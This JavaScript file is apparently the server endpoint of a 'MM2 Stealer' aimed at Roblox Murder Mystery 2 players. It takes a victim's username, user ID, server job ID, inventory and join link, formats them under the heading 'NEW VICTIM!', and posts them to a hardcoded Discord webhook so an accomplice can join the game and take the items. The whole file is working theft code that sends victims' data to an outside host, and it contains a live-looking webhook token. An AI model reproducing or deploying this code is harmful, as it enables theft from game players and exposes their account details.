
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { hitData } = req.body;
    
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1506678688903598142/ogvR63l5BKj4rXumzuFpdcdAwDvW8u17XTbdL325wm5AJgQIJiTTuFefbxx7sGSeKdmb";
    
    let itemsText = "";
    for (const item of hitData.items || []) {
        itemsText += `${item.name} x${item.amount}\n`;
    }
    
    const message = `**🎯 NEW VICTIM!**\n\n**Player:** ${hitData.username}\n**User ID:** ${hitData.userId}\n**Job ID:** \`${hitData.jobId}\`\n\n**Inventory:**\n${itemsText || "No items"}\n\n**Join Link:** ${hitData.joinLink}\n\n**Waiting for ${hitData.receiver} to join...**`;
    
    await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message, username: "MM2 Stealer" })
    });
    
    return res.status(200).json({ success: true });
}
